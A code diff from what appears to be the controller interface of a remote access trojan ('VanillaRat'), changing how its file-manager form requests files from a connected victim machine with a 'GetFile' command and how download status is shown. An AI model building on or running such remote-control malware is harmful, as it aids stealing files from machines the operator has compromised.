@@ -89,13 +89,6 @@ namespace VanillaRat.Forms
         //Download selected file
         private void btnDownloadFile_Click(object sender, EventArgs e)
         {
-            if (!TempDataHelper.CanDownload)
-            {
-                MessageBox.Show("Error: Can not download multiple files at once.", "Error", MessageBoxButtons.OK,
-                    MessageBoxIcon.Error);
-                return;
-            }
-
             if (txtCurrentDirectory.Text.Length < 3)
                 return;
             if (lbFiles.SelectedItems.Count == 0)
@@ -114,12 +107,9 @@ namespace VanillaRat.Forms
             var Stream = File.Create(TempDataHelper.DownloadLocation);
             Stream.Close();
             Server.MainServer.Send(ConnectionID,
-                Encoding.ASCII.GetBytes("GetFile{" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text +
-                                        Item.SubItems[1].Text + "}"));
-            Server.DFF = new DownloadingFileForm();
-            Server.DFF.Show();
-            Server.DFF.txtDownloadingFile.Text = Item.SubItems[0].Text + Item.SubItems[1].Text;
-            TempDataHelper.CanDownload = false;
+                Encoding.ASCII.GetBytes("GetFile{[" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text +
+                                        Item.SubItems[1].Text + "]}"));
+            AutoClosingMessageBox.Show("Starting file download.", "Download Started", 1000);
         }
 
         //Upload file
@@ -169,7 +159,7 @@ namespace VanillaRat.Forms
         private void lbFiles_DragDrop(object sender, DragEventArgs e)
         {
             int MaximumFiles = 0;
-            string[] File = (string[])e.Data.GetData(DataFormats.FileDrop, false);
+            string[] File = (string[]) e.Data.GetData(DataFormats.FileDrop, false);
             foreach (string S in File)
                 MaximumFiles++;
             if (MaximumFiles > 1)
